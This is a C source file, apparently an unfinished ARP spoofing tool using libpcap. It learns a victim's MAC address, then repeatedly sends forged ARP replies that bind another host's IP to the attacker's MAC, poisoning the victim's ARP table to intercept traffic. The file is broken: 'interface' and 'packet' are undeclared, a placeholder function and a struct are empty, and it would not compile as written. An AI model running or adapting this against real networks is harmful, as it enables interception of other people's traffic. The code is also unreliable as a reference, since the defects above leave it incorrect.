#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<pcap.h>
#include<netinet/if_ether.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<sys/ioctl.h>
#include<net/if.h>
#include<string.h>
#include<stdint.h>
#include<arpa/inet.h>
#include<netinet/in.h>


typedef struct{
/*ethernet header*/
    u_char targ_hw_addr[6];
    u_char src_hw_addr[6];
    u_short ether_type;
/**/                     
    u_int16_t	hw_type;
    u_int16_t	prot_type;
    u_int8_t	hw_addr_size;
    u_int8_t 	prot_addr_size;
    u_int16_t 	op_code;
    u_int8_t 	source_mac[6];
    u_int8_t 	source_ip[4];
    u_int8_t 	destination_mac[6];
    u_int8_t 	destination_ip[4];
}arp_packet;

typedef struct{
/*ehternet header*/
}tcp_ip_packet;





void get_mac_address(u_int8_t *mac_address, u_int8_t *interface)
{
	int fd;
	struct ifreq ifr;
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, interface, sizeof(ifr.ifr_name));
	ioctl(fd, SIOCGIFHWADDR, &ifr);
	memcpy(mac_address, ifr.ifr_hwaddr.sa_data, 6);
	close(fd);
}

void get_ip_address(u_int8_t *ip_address, u_int8_t *interface) {
	int fd;
	struct ifreq ifr;
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
	ioctl(fd, SIOCGIFADDR, &ifr);
	memcpy(ip_address, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, 4);
	close(fd);
}

void ARP_INFECTON()
{
	
}


int main(int argc, char *argv[])
{
	pcap_t *handle;				/* Session handle */
	u_int8_t *dev;				/* The device to sniff on */
	u_int8_t errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	struct pcap_pkthdr *header;		/* The header that pcap gives us */
	const u_char *packet_get;
	u_int8_t arp_packet[42];
	u_int8_t attacker_mac[6];
	u_int8_t attacker_ip[4];
	u_int8_t sender_mac[6];
       	u_int8_t sender_ip[4];
        u_int8_t receiver_mac[6];
        u_int8_t receiver_ip[4];


	/* Define the device */
	dev = argv[1];
	if (dev == NULL) {
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		return(2);
	}
	
	
	/* Open the session in promiscuous mode */
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}

	/*set sender's and receiver's ip address*/	
	inet_pton(AF_INET, argv[2], sender_ip);
	inet_pton(AF_INET, argv[3], receiver_ip);

	/*PART_1 : find attacker's ip and mac address*/
	get_mac_address(attacker_mac, interface);
	get_ip_address(attacker_ip, interface);

/*************______________________ARP INFECTION START______________________________________*****************/
	/*PART_2 : make arp packet (attacker -> sender)*/

	//ethernet header Destination : Broadcast
	arp_packet[0] = 0xff;arp_packet[1] = 0xff;arp_packet[2] = 0xff;arp_packet[3] = 0xff;arp_packet[4] = 0xff;arp_packet[5] = 0xff;
	//ethernet header Source
	arp_packet[6] = attacker_mac[0];arp_packet[7] = attacker_mac[1];arp_packet[8] = attacker_mac[2];arp_packet[9] = attacker_mac[3];arp_packet[10] = attacker_mac[4];arp_packet[11] = attacker_mac[5];
	//ehternet header Type
	arp_packet[12] = 0x08; arp_packet[13] = 0x06;
	//arp header basic setting
	arp_packet[14] = 0x00;arp_packet[15] = 0x01;arp_packet[16] = 0x08;arp_packet[17] = 0x00;arp_packet[18] = 0x06;arp_packet[19] = 0x04;arp_packet[20] = 0x00;arp_packet[21] = 0x01;
	//arp header Source Hardware Address
	arp_packet[22] = attacker_mac[0];arp_packet[23] = attacker_mac[1];arp_packet[24]=attacker_mac[2];arp_packet[25] = attacker_mac[3];arp_packet[26] = attacker_mac[4];arp_packet[27] = attacker_mac[5];
	//arp header Source Protocol Address
	arp_packet[28] = attacker_ip[0];arp_packet[29] = attacker_ip[1];arp_packet[30] = attacker_ip[2];arp_packet[31] = attacker_ip[3];
	//arp header Destination Hardware Address
	arp_packet[32] = 0x00; arp_packet[33] = 0x00; arp_packet[34] = 0x00; arp_packet[35] = 0x00; arp_packet[36] = 0x00; arp_packet[37] = 0x00;
	//arp header Destination Protocol Address
	arp_packet[38] = sender_ip[0];arp_packet[39] = sender_ip[1];arp_packet[40] = sender_ip[2];arp_packet[41] = sender_ip[3];

	pcap_sendpacket(handle, arp_packet, 42);
	

	/*PART_3 : get arp reply and find sender's mac address*/
	while(1)
	{
		pcap_next_ex(handle, &header, &packet_get);
		if( (packet_get[12] == 0x08) && (packet_get[13] == 0x06) && (packet_get[20] == 0x00) && (packet_get[21] == 0x02) && (packet_get[28] == sender_ip[0]) &&
		(packet_get[29] == sender_ip[1]) && (packet_get[30] == sender_ip[2]) && (packet_get[31] == sender_ip[3]) ) 	break;
	}
		
	//get target's mac address
	sender_mac[0] = packet_get[22];sender_mac[1] = packet_get[23];sender_mac[2] = packet_get[24];sender_mac[3] = packet_get[25];sender_mac[4] = packet_get[26];sender_mac[5] = packet_get[27];

	/*PART_4 : send fake arp reply packet to sender and change sender's arp table*/
	
	//ethernet header Destination : Unicast
	packet[0] = sender_mac[0];packet[1] = sender_mac[1];packet[2] = sender_mac[2];packet[3] = sender_mac[3];packet[4] = sender_mac[4];packet[5] = sender_mac[5];
	//ethernet header Source
	packet[6] = attacker_mac[0];packet[7] = attacker_mac[1];packet[8] = attacker_mac[2];packet[9] = attacker_mac[3];packet[10] = attacker_mac[4];packet[11] = attacker_mac[5];
	//ehternet header Type : arp
	packet[12] = 0x08; packet[13] = 0x06;
	//arp header basic setting
	packet[14] = 0x00;packet[15] = 0x01;packet[16] = 0x08;packet[17] = 0x00;packet[18] = 0x06;packet[19] = 0x04;packet[20] = 0x00;packet[21] = 0x02; // fake reply
	//arp header Source Hardware Address
	packet[22] = attacker_mac[0];packet[23] = attacker_mac[1];packet[24] = attacker_mac[2];packet[25] = attacker_mac[3];packet[26] = attacker_mac[4];packet[27] = attacker_mac[5];
	//arp header Source Protocol Address
	packet[28] = receiver_ip[0];packet[29] = receiver_ip[1];packet[30] = receiver_ip[2];packet[31] = receiver_ip[3]; // sender's ip address
	//arp header Destination Hardware Address
	packet[32] = sender_mac[0]; packet[33] = sender_mac[1]; packet[34] = sender_mac[2]; packet[35] = sender_mac[3]; packet[36] = sender_mac[4]; packet[37] = sender_mac[5];
	//arp header Destination Protocol Address
	packet[38] = sender_ip[0];packet[39] = sender_ip[1];packet[40] = sender_ip[2];packet[41] = sender_ip[3];


	while(1)
	{
		pcap_sendpacket(handle, packet, 42);
		sleep(5);

	}

 /*************______________________ARP INFECTION START______________________________________*****************/



	/* And close the session */
	pcap_close(handle);
	return(0);



 }
